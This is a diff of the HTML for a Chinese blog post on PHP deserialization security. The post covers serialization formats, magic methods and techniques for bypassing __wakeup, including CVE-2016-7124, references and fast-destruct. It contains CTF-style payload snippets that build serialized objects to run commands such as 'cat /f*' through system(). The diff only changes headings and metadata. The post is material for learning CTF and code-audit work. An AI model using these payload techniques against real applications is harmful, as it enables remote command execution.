@@ -11,7 +11,7 @@
   <meta itemprop="name" content="php反序列化">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="1669">
+  <meta itemprop="wordCount" content="1640">
   <meta itemprop="keywords" content="代码审计,Php安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/23/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="php反序列化">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E\/23\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  1669 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  1640 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E\/23\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Php反序列化</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1669 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1700 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>8 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1640 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1700 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>8 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,30 +152,58 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
+    <li><a href="#cve-2016-7124">cve-2016-7124</a></li>
+    <li><a href="#call">call</a></li>
+    <li><a href="#引用">引用</a></li>
+    <li><a href="#fast-destruct">fast-destruct</a></li>
+    <li><a href="#php-issue9618">php issue#9618</a></li>
+    <li><a href="#使用c绕过">使用C绕过</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#漏洞利用条件">漏洞利用条件</a></li>
+    <li><a href="#文件结构">文件结构</a></li>
+    <li><a href="#生成phar">生成phar</a></li>
+    <li><a href="#利用">利用</a>
+      <ul>
+        <li><a href="#触发phar的函数">触发phar的函数</a></li>
+        <li><a href="#用法">用法</a></li>
+      </ul>
+    </li>
+    <li><a href="#bypass">bypass</a></li>
+    <li><a href="#010">010</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#垃圾回收gc">垃圾回收GC</a></li>
+    <li><a href="#fast-destruct-1">fast-destruct</a></li>
+  </ul>
+
+  <ul>
     <li>
       <ul>
-        <li></li>
+        <li><a href="#以强网杯2021-whereisuwebshell-为例">以强网杯2021 WhereIsUWebShell 为例</a></li>
       </ul>
     </li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="heading" class="heading-element"><span>0.0.0.1  </span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="heading" class="heading-element"><span></span>
   <a href="#heading" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h5 id="序列化字符串" class="heading-element"><span>0.0.0.2  序列化字符串</span>
+</h1><h1 id="序列化字符串" class="heading-element"><span>序列化字符串</span>
   <a href="#%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p><strong>序列化中各种数据表达方式</strong>在PHP中对不同类型的数据用不同的字母来标识：a - array(数组型) b - boolean（布尔型） d - double（双精度型） i - integer（整数型） o - common object（一般对象） r - reference（引用） s - string（字符型） C - custom object（自定义对象） O - class（类） N - null（空） R - pointer reference（指针、引用） U - unicode string（编码的字符串）</p>
 </blockquote>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161545315.png" alt="image-20230316154540260" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161545315.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161545315.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161545315.png?size=large 2x" data-title="image-20230316154540260" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="魔法方法" class="heading-element"><span>0.0.0.3  魔法方法</span>
+<h1 id="魔法方法" class="heading-element"><span>魔法方法</span>
   <a href="#%e9%ad%94%e6%b3%95%e6%96%b9%e6%b3%95" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><pre tabindex="0"><code>__wakeup() //执行unserialize()时，先会调用这个函数
+</h1><pre tabindex="0"><code>__wakeup() //执行unserialize()时，先会调用这个函数
 __sleep() //执行serialize()时，先会调用这个函数，session反序列化同样会调用
 __destruct() //对象被销毁时触发
 __call() //在对象上下文中调用不可访问的方法时触发
@@ -185,17 +213,17 @@ __set() //用于将数据写入不可访问的属性
 __isset() //在不可访问的属性上调用isset()或empty()触发
 __unset() //在不可访问的属性上使用unset()时触发
 __toString() //把类当作字符串使用时触发
-__invoke() //当尝试将对象调用为函数时触发</code></pre><h5 id="tricks" class="heading-element"><span>0.0.0.4  tricks</span>
+__invoke() //当尝试将对象调用为函数时触发</code></pre><h1 id="tricks" class="heading-element"><span>tricks</span>
   <a href="#tricks" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><pre tabindex="0"><code>f1=[new mix(),get_flag]
+</h1><pre tabindex="0"><code>f1=[new mix(),get_flag]
 ($this-&gt;f1)()
-[new mix(),&#39;get_flag&#39;]()</code></pre><h5 id="访问控制修饰符" class="heading-element"><span>0.0.0.5  访问控制修饰符</span>
+[new mix(),&#39;get_flag&#39;]()</code></pre><h1 id="访问控制修饰符" class="heading-element"><span>访问控制修饰符</span>
   <a href="#%e8%ae%bf%e9%97%ae%e6%8e%a7%e5%88%b6%e4%bf%ae%e9%a5%b0%e7%ac%a6" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>根据<strong>访问控制修饰符的不同</strong> 序列化后的 <strong>属性长度</strong>和<strong>属性值</strong>会有所不同</p>
+</h1><p>根据<strong>访问控制修饰符的不同</strong> 序列化后的 <strong>属性长度</strong>和<strong>属性值</strong>会有所不同</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">public</span>(<span style="color:#58a1dd">公有</span>) 
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">protected</span>(<span style="color:#58a1dd">受保护</span>)     <span style="color:#828b96;font-style:italic">// %00*%00属性名
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">private</span>(<span style="color:#58a1dd">私有的</span>)       <span style="color:#828b96;font-style:italic">// %00类名%00属性名
@@ -218,11 +246,11 @@ __invoke() //当尝试将对象调用为函数时触发</code></pre><h5 id="tric
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">;s:12:</span><span style="color:#a6be9d">\&#34;\000</span><span style="color:#a6be9d">push_it</span><span style="color:#a6be9d">\000</span><span style="color:#a6be9d">pwd</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">;&#34;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">serialize</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">pull_it</span>(<span style="color:#a6be9d">&#34;(~&#34;</span><span style="color:#ff636f">.~</span><span style="color:#a6be9d">&#34;system&#34;</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;)(~&#34;</span><span style="color:#ff636f">.~</span><span style="color:#a6be9d">&#34;cat /f*&#34;</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;);&#34;</span>));
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$c</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$b</span>;
-</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">urlencode</span>(<span style="color:#58a1dd">$c</span>));</span></span></code></pre></div><h5 id="绕过wakeup" class="heading-element"><span>0.0.0.6  绕过wakeup</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">urlencode</span>(<span style="color:#58a1dd">$c</span>));</span></span></code></pre></div><h1 id="绕过wakeup" class="heading-element"><span>绕过wakeup</span>
   <a href="#%e7%bb%95%e8%bf%87wakeup" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p><a href="https://fushuling.com/index.php/2023/03/11/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%adwakeup%e7%bb%95%e8%bf%87%e6%80%bb%e7%bb%93/"target="_blank" rel="external nofollow noopener noreferrer">PHP反序列化中wakeup()绕过总结</a></p>
+</h1><p><a href="https://fushuling.com/index.php/2023/03/11/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%adwakeup%e7%bb%95%e8%bf%87%e6%80%bb%e7%bb%93/"target="_blank" rel="external nofollow noopener noreferrer">PHP反序列化中wakeup()绕过总结</a></p>
 <p><a href="https://www.viewofthai.link/2022/11/08/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8b%e7%bb%95%e8%bf%87wakeup/"target="_blank" rel="external nofollow noopener noreferrer">php反序列化之绕过wakeup</a></p>
 <p><a href="https://www.jianshu.com/p/d73b3ca418b0"target="_blank" rel="external nofollow noopener noreferrer">https://www.jianshu.com/p/d73b3ca418b0</a></p>
 <p>一般来说，绕过wakup无非：</p>
@@ -232,31 +260,31 @@ __invoke() //当尝试将对象调用为函数时触发</code></pre><h5 id="tric
 <li>fast-destruct</li>
 <li>使用C绕过</li>
 </ul>
-<h6 id="cve-2016-7124" class="heading-element"><span>0.0.0.6.1  cve-2016-7124</span>
+<h2 id="cve-2016-7124" class="heading-element"><span>cve-2016-7124</span>
   <a href="#cve-2016-7124" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>影响范围：</p>
+</h2><p>影响范围：</p>
 <ul>
 <li>PHP5 &lt; 5.6.25</li>
 <li>PHP7 &lt; 7.0.10</li>
 </ul>
 <p><strong>当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行</strong>。</p>
-<h6 id="call" class="heading-element"><span>0.0.0.6.2  call</span>
+<h2 id="call" class="heading-element"><span>call</span>
   <a href="#call" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ul>
+</h2><ul>
 <li>7.4.x -7.4.30</li>
 <li>8.0.x</li>
 </ul>
 <p><a href="https://github.com/php/php-src/issues/9618"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/php/php-src/issues/9618</a></p>
 <p>执行顺序__call-&gt;des-&gt;__wakeup</p>
-<h6 id="引用" class="heading-element"><span>0.0.0.6.3  引用</span>
+<h2 id="引用" class="heading-element"><span>引用</span>
   <a href="#%e5%bc%95%e7%94%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。</p>
+</h2><p>在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。</p>
 <p>比如：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">test</span> (<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">$a</span>){
@@ -310,11 +338,11 @@ __invoke() //当尝试将对象调用为函数时触发</code></pre><h5 id="tric
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$keyport</span>); 
 </span></span></code></pre></div><p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/03/1-23.jpg" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/03/1-23.jpg?size=small, https://fushuling.com/wp-content/uploads/2023/03/1-23.jpg?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/03/1-23.jpg?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>2022年中国工业互联网安全大赛预选赛里有道wakeup题就是运用了这个知识点，具体可以看<a href="https://forum.butian.net/share/1936"target="_blank" rel="external nofollow noopener noreferrer">2022年中国工业互联网安全大赛北京市选拔赛暨全国线上预选赛-Writeup</a>，这道题用了很巧妙的方法绕过了死亡wakeup最后构造了命令。</p>
-<h6 id="fast-destruct" class="heading-element"><span>0.0.0.6.4  fast-destruct</span>
+<h2 id="fast-destruct" class="heading-element"><span>fast-destruct</span>
   <a href="#fast-destruct" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>1、如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p>
+</h2><p>1、如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p>
 <p>2、如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。</p>
 <ul>
 <li>一种方式就是修改序列化字符串的结构，使得完成部分反序列化的unserialize强制退出，提前触发<code>__destruct</code></li>
@@ -504,15 +532,15 @@ $result = serialize($arry);echo $result.&#34;&lt;br&gt;&#34;;
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$c</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">code</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$e</span>;
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$e</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">key</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$d</span>;
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> (<span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$a</span>));
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####O:5:&#34;sorry&#34;:4:{s:4:&#34;name&#34;;N;s:8:&#34;password&#34;;N;s:3:&#34;key&#34;;N;s:4:&#34;hint&#34;;O:4:&#34;show&#34;:1:{s:3:&#34;ctf&#34;;O:11:&#34;secret_code&#34;:1:{s:4:&#34;code&#34;;O:5:&#34;sorry&#34;:4:{s:4:&#34;name&#34;;N;s:8:&#34;password&#34;;N;s:3:&#34;key&#34;;O:4:&#34;fine&#34;:2:{s:3:&#34;cmd&#34;;s:6:&#34;system&#34;;s:7:&#34;content&#34;;s:2:&#34; /&#34;;}s:4:&#34;hint&#34;;r:10;}}}}
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#O:5:&#34;sorry&#34;:4:{s:4:&#34;name&#34;;N;s:8:&#34;password&#34;;N;s:3:&#34;key&#34;;N;s:4:&#34;hint&#34;;O:4:&#34;show&#34;:1:{s:3:&#34;ctf&#34;;O:11:&#34;secret_code&#34;:1:{s:4:&#34;code&#34;;O:5:&#34;sorry&#34;:4:{s:4:&#34;name&#34;;N;s:8:&#34;password&#34;;N;s:3:&#34;key&#34;;O:4:&#34;fine&#34;:2:{s:3:&#34;cmd&#34;;s:6:&#34;system&#34;;s:7:&#34;content&#34;;s:2:&#34; /&#34;;}s:4:&#34;hint&#34;;r:10;}}}}
 </span></span></span></code></pre></div><p>直接传进去毫无疑问会因为die()而终止，这里我们就可以用fast-destruct这个技巧使destruct提前发生以绕过wakeup()，比如我们可以减少一个} ：</p>
